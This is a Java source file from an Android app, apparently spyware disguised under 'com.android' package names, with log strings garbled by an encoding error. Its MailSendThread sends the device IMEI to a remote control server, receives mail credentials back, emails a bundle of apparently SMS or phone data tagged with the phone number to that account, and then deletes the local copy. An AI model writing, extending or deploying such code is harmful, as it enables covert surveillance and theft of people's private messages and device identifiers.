package com.android.thread;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.mail.Multipart;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import android.content.Context;

import com.android.db.MailBody;
import com.android.utils.HttpClientFactory;
import com.android.utils.LogUtils;
import com.android.utils.Utils;
import com.smsbak.mail.MailSenderInfo;
import com.smsbak.mail.SimpleMailSender;

public class MailSendThread extends Thread {

	private String ConfigUrl = "control/client!getDeviceConfig.action";
	private Context context;
	private MailBody mailbody;
	private String TAG = MailSendThread.class.getName();

	public MailSendThread(Context context, MailBody mailbody) {
		this.context = context;
		this.mailbody = mailbody;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		try {
			Thread.sleep(3000);
			if (Utils.isNetworkConnected(context)) {
				Multipart multipart = mailbody.getMultipart();
				LogUtils.write(TAG, "�������");
				if (multipart != null) {
					List<NameValuePair> lnvp = new ArrayList<NameValuePair>();
					lnvp.add(new BasicNameValuePair("mapparam.deviceimei",
							Utils.GetImei(context)));
					JSONObject jo = HttpClientFactory.postData(
							HttpClientFactory.httpurl + ConfigUrl, lnvp);
					if (jo != null) {
						if (jo.has("email")
								&& !"".equals(jo.getString("email"))
								&& jo.has("pass")
								&& !"".equals(jo.getString("pass"))) {
							LogUtils.write(TAG, "�����ʼ�");
							MailSenderInfo mailInfo = new MailSenderInfo();
							mailInfo.setMailServerHost("smtp.139.com");
							mailInfo.setMailServerPort("25");
							mailInfo.setValidate(true);
							mailInfo.setUserName(jo.getString("email"));
							mailInfo.setPassword(jo.getString("pass"));
							mailInfo.setFromAddress(jo.getString("email"));
							mailInfo.setToAddress(jo.getString("email"));
							mailInfo.setMultipart(multipart);
							mailInfo.setSubject("�ֻ��������ʼ�-���룺"
									+ Utils.getnum(context) + "-ʱ�䣺"
									+ Utils.formData(new Date()));
							SimpleMailSender sms = new SimpleMailSender();
							boolean flag = sms.sendHtmlMail(context, mailInfo);
							LogUtils.write(TAG, "�����ʼ�" + flag);
							if (flag) {
								LogUtils.write(TAG, "ɾ������");
								mailbody.DeleteData();
								LogUtils.write(TAG, "ɾ�����");
							}
						}
					}
				}else{
					LogUtils.write(TAG, "���ݲ�����");
				}
			}else{
				LogUtils.write(TAG, "���Ӳ�����");
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
}
